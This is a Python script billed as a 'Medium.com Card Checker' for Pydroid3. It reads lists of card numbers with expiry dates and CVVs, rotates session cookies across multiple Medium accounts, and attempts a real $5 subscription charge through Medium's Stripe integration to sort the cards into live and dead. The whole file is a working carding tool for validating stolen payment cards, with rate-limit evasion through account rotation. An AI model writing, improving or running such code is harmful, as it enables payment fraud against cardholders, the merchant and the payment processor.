"""
Medium.com Card Checker for Pydroid3
Full $5 Charge Gate with Multiple Cookie Rotation
"""

import requests
import random
import string
import uuid
import time
import os
import re
import json

# ============ CONFIGURATION ============
INPUT_FILE = "cards.txt"
COOKIE_FILE = "cookies.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 3  # Delay between checks (seconds)
# =======================================

def generate_guid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_muid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_sid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def get_bin_info(cc):
    """Get BIN information"""
    try:
        bin_code = cc[:6]
        r = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=10)
        if r.status_code == 200:
            data = r.json()
            vendor = data.get('scheme', 'Unknown').upper()
            card_type = data.get('type', 'Unknown').upper()
            level = data.get('brand', 'Unknown').upper()
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '')
            return f"{vendor} - {card_type} - {level} | {bank} | {country} {flag}"
    except:
        pass
    return f"BIN: {cc[:6]}"

def parse_cookie_dict(text):
    """Parse Python dict format cookies"""
    cookies = {}
    
    # Find all 'key': 'value' patterns
    pattern = r"['\"]([^'\"]+)['\"]\s*:\s*['\"]([^'\"]+)['\"]"
    matches = re.findall(pattern, text)
    
    for key, value in matches:
        cookies[key] = value
    
    return cookies

def load_all_cookies():
    """Load multiple cookie sets from cookies.txt"""
    
    if not os.path.exists(COOKIE_FILE):
        return []
    
    with open(COOKIE_FILE, 'r') as f:
        content = f.read()
    
    cookie_sets = []
    
    # Split by "cookies = {" or empty lines between dict blocks
    # Find all cookie dict blocks
    blocks = re.split(r'\n\s*\n', content)
    
    for block in blocks:
        block = block.strip()
        
        # Skip comments and empty blocks
        if not block or block.startswith('#'):
            continue
        
        # Skip if it's headers or json_data block
        if 'headers' in block.lower() and 'authority' in block:
            continue
        if 'json_data' in block.lower():
            continue
        if 'operationName' in block:
            continue
        
        # Check if it contains cookie data
        if 'uid' in block and 'sid' in block:
            cookies = parse_cookie_dict(block)
            if cookies and 'uid' in cookies and 'sid' in cookies:
                cookie_sets.append(cookies)
    
    # Remove duplicates based on uid
    seen_uids = set()
    unique_sets = []
    for cookies in cookie_sets:
        uid = cookies.get('uid', '')
        if uid and uid not in seen_uids:
            seen_uids.add(uid)
            unique_sets.append(cookies)
    
    return unique_sets

def get_medium_session(cookies):
    """Create session with Medium cookies"""
    session = requests.Session()
    
    if cookies:
        for name, value in cookies.items():
            session.cookies.set(name, value, domain='.medium.com')
    
    return session

def get_payment_intent(session, cookies):
    """Get payment intent from Medium for $5 monthly subscription"""
    
    headers = {
        'authority': 'medium.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://medium.com',
        'referer': 'https://medium.com/plans',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'apollographql-client-name': 'lite',
        'apollographql-client-version': 'main-20260116-161017-b2412ec54c',
        'medium-frontend-app': 'lite/main-20260116-161017-b2412ec54c',
        'medium-frontend-path': '/plans',
        'medium-frontend-route': 'plans',
    }
    
    # Get XSRF token from cookies
    xsrf = cookies.get('xsrf', '')
    if xsrf:
        headers['x-xsrf-token'] = xsrf
    
    # GraphQL mutation to create payment intent for monthly subscription
    json_data = {
        'operationName': 'InitiateStripeSubscriptionMutation',
        'variables': {
            'planId': 'monthly',
            'successPath': '/welcome-member',
            'cancelPath': '/plans'
        },
        'query': '''mutation InitiateStripeSubscriptionMutation($planId: String!, $successPath: String!, $cancelPath: String!) {
            initiateStripeSubscription(planId: $planId, successPath: $successPath, cancelPath: $cancelPath) {
                clientSecret
                __typename
            }
        }'''
    }
    
    try:
        r = session.post('https://medium.com/_/graphql', headers=headers, json=json_data, timeout=30)
        data = r.json()
        
        if 'errors' in data:
            error_msg = data['errors'][0].get('message', 'Unknown error')
            return None, None, f"GraphQL Error: {error_msg}"
        
        if 'data' in data and data['data'].get('initiateStripeSubscription'):
            client_secret = data['data']['initiateStripeSubscription'].get('clientSecret')
            if client_secret:
                # Extract payment intent ID: pi_xxxxx_secret_xxxxx
                pi_id = client_secret.split('_secret_')[0]
                return pi_id, client_secret, None
        
        return None, None, "No payment intent returned"
        
    except Exception as e:
        return None, None, str(e)

def create_payment_method(cc, mes, ano, cvv, muid, sid, guid):
    """Create Stripe payment method"""
    
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(random.randint(30000, 60000)),
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def confirm_payment_intent(pm_id, pi_id, client_secret):
    """Confirm payment intent to charge the card"""
    
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'return_url': 'https://medium.com/welcome-member',
        'payment_method': pm_id,
        'expected_payment_method_type': 'card',
        'use_stripe_sdk': 'true',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'l1',
        'client_secret': client_secret,
    }
    
    try:
        r = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers, data=data, timeout=30)
        return r.json()
    except Exception as e:
        return {'error': {'message': str(e)}}

def parse_confirm_response(response):
    """Parse payment intent confirm response"""
    
    if 'error' in response:
        error = response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', 'Unknown error')
        
        # CCN codes - card is live but declined
        ccn_codes = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect_zip',
            'insufficient_funds', 'card_velocity_exceeded',
            'do_not_honor', 'generic_decline', 'lost_card',
            'stolen_card', 'pickup_card', 'restricted_card',
            'security_violation', 'service_not_allowed',
            'transaction_not_allowed', 'withdrawal_count_limit_exceeded',
            'try_again_later', 'not_permitted', 'revocation_of_authorization',
            'invalid_amount', 'processing_error', 'reenter_transaction'
        ]
        
        # 3DS required - card is live
        if code == 'authentication_required' or 'authentication' in message.lower() or '3d' in message.lower():
            return 'CCN', '3DS Required'
        
        if code in ccn_codes or decline_code in ccn_codes:
            return 'CCN', f"{decline_code or code}"
        
        # Expired card - still means card exists
        if 'expired' in code or 'expired' in decline_code:
            return 'CCN', 'Expired Card'
        
        if 'rate_limit' in code:
            return 'RATE_LIMIT', message
        
        # Card declined
        return 'DECLINED', f"{decline_code or code or message}"
    
    # Check status
    status = response.get('status', '')
    
    if status == 'succeeded':
        return 'CHARGED', 'Payment Successful - $5 Charged!'
    elif status == 'requires_action':
        next_action = response.get('next_action', {})
        action_type = next_action.get('type', '')
        if 'redirect' in action_type or '3d' in action_type.lower():
            return 'CCN', '3DS Required'
        return 'CCN', f'Requires Action: {action_type}'
    elif status == 'requires_payment_method':
        return 'DECLINED', 'Payment Method Required'
    elif status == 'processing':
        return 'CHARGED', 'Processing (Likely Charged)'
    elif status == 'requires_confirmation':
        return 'CCN', 'Requires Confirmation'
    
    return 'UNKNOWN', f"Status: {status}"

def check_card(cookies, cc, mes, ano, cvv):
    """
    Full card check flow:
    1. Get payment intent from Medium
    2. Create payment method
    3. Confirm payment intent (actual charge)
    """
    
    # Normalize
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    # Generate consistent session tokens
    guid = generate_guid()
    muid = generate_muid()
    sid = generate_sid()
    
    # Create session with cookies
    session = get_medium_session(cookies)
    
    # Step 1: Get payment intent
    pi_id, client_secret, error = get_payment_intent(session, cookies)
    
    if error:
        return 'ERROR', f"PI Error: {error}"
    
    if not pi_id or not client_secret:
        return 'ERROR', 'Failed to get payment intent'
    
    # Step 2: Create payment method
    pm_response = create_payment_method(cc, mes, ano, cvv, muid, sid, guid)
    
    if 'error' in pm_response:
        error = pm_response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', '')
        
        if 'invalid' in code.lower() or 'invalid' in message.lower():
            return 'DECLINED', f"Invalid Card: {message}"
        
        return 'DECLINED', f"{decline_code or code or message}"
    
    pm_id = pm_response.get('id', '')
    if not pm_id:
        return 'ERROR', 'No PM ID returned'
    
    # Step 3: Confirm payment intent (THIS IS THE ACTUAL CHARGE)
    confirm_response = confirm_payment_intent(pm_id, pi_id, client_secret)
    
    status, message = parse_confirm_response(confirm_response)
    
    return status, message

def save_result(card, status, message):
    """Save card to appropriate file"""
    if status in ['CHARGED', 'CCN']:
        with open(LIVE_FILE, 'a') as f:
            f.write(f"{card} | {message}\n")
    else:
        with open(DEAD_FILE, 'a') as f:
            f.write(f"{card} | {message}\n")

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      MEDIUM.COM CARD CHECKER          ║
    ║         FOR PYDROID3                  ║
    ║   $5 CHARGE - MULTI COOKIE ROTATION   ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Load all cookie sets
    all_cookies = load_all_cookies()
    
    if not all_cookies:
        print(f"[!] No cookies found in {COOKIE_FILE}!")
        print(f"\n[*] Creating {COOKIE_FILE}...")
        with open(COOKIE_FILE, 'w') as f:
            f.write("""# Paste your Medium cookies here
# You can add multiple cookie sets - they will be rotated

# === COOKIE SET 1 ===
cookies = {
    'uid': 'your_uid_here',
    'sid': 'your_sid_here',
    'xsrf': 'your_xsrf_here',
}

# === COOKIE SET 2 ===
cookies = {
    'uid': 'another_uid',
    'sid': 'another_sid',
    'xsrf': 'another_xsrf',
}

# Add more cookie sets below...
""")
        print(f"[*] Please add cookies to {COOKIE_FILE}")
        print("[*] You can add multiple cookie sets for rotation!")
        return
    
    print(f"[+] Loaded {len(all_cookies)} cookie set(s)")
    for i, cookies in enumerate(all_cookies, 1):
        uid = cookies.get('uid', 'N/A')[:8]
        print(f"    [{i}] uid: {uid}...")
    
    # Check cards.txt
    if not os.path.exists(INPUT_FILE):
        print(f"\n[!] {INPUT_FILE} not found!")
        with open(INPUT_FILE, 'w') as f:
            f.write("# Add cards here\n")
            f.write("# Format: cc|mm|yy|cvv\n")
        print(f"[*] Created {INPUT_FILE} - add cards and run again.")
        return
    
    # Read cards
    with open(INPUT_FILE, 'r') as f:
        lines = f.readlines()
    
    cards = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            parts = line.split('|')
            if len(parts) >= 4:
                cards.append(line)
    
    if not cards:
        print("[!] No valid cards in cards.txt")
        return
    
    print(f"\n[*] Loaded {len(cards)} cards")
    print(f"[*] Gate: Medium $5 Monthly Charge")
    print(f"[*] Cookie Rotation: {len(all_cookies)} accounts")
    print(f"[*] Delay: {DELAY}s")
    print("=" * 50)
    
    total = len(cards)
    charged = 0
    ccn = 0
    dead = 0
    errors = 0
    
    cookie_index = 0
    
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        cc = parts[0].strip()
        mes = parts[1].strip()
        ano = parts[2].strip()
        cvv = parts[3].strip()
        
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        # Get current cookie set (rotation)
        current_cookies = all_cookies[cookie_index]
        cookie_uid = current_cookies.get('uid', 'N/A')[:8]
        
        print(f"\n[{i}/{total}] {cc[:6]}xxxxxx{cc[-4:]} [Cookie: {cookie_uid}...]")
        
        start = time.time()
        status, message = check_card(current_cookies, cc, mes, ano, cvv)
        elapsed = round(time.time() - start, 2)
        
        bin_info = get_bin_info(cc)
        
        if status == 'CHARGED':
            print(f"[CHARGED] {fullcc}")
            print(f"[+] {message}")
            print(f"[+] {bin_info}")
            charged += 1
            save_result(fullcc, status, message)
            
        elif status == 'CCN':
            print(f"[CCN] {fullcc}")
            print(f"[+] {message}")
            print(f"[+] {bin_info}")
            ccn += 1
            save_result(fullcc, status, message)
            
        elif status == 'RATE_LIMIT':
            print(f"[!] Rate Limited on cookie {cookie_uid}")
            # Try next cookie
            cookie_index = (cookie_index + 1) % len(all_cookies)
            print(f"[*] Switching to next cookie...")
            time.sleep(5)
            errors += 1
            
        elif status == 'ERROR':
            print(f"[ERROR] {fullcc}")
            print(f"[-] {message}")
            errors += 1
            
            # Check if cookie expired
            if 'unauthorized' in message.lower() or 'login' in message.lower() or 'not authenticated' in message.lower():
                print(f"[!] Cookie {cookie_uid} expired!")
                # Remove this cookie and try next
                if len(all_cookies) > 1:
                    all_cookies.pop(cookie_index)
                    cookie_index = cookie_index % len(all_cookies)
                    print(f"[*] Switching to next cookie ({len(all_cookies)} remaining)")
                else:
                    print("[!] No more valid cookies!")
                    break
            
        else:
            print(f"[DEAD] {fullcc}")
            print(f"[-] {message}")
            dead += 1
            save_result(fullcc, status, message)
        
        print(f"[*] {elapsed}s")
        
        # Rotate to next cookie for next card
        cookie_index = (cookie_index + 1) % len(all_cookies)
        
        if i < total:
            time.sleep(DELAY)
    
    print("\n" + "=" * 50)
    print("           SUMMARY")
    print("=" * 50)
    print(f"Total:     {total}")
    print(f"Charged:   {charged}")
    print(f"CCN:       {ccn}")
    print(f"Dead:      {dead}")
    print(f"Errors:    {errors}")
    print("=" * 50)
    print(f"Live saved to: {LIVE_FILE}")
    print(f"Dead saved to: {DEAD_FILE}")

if __name__ == "__main__":
    main()
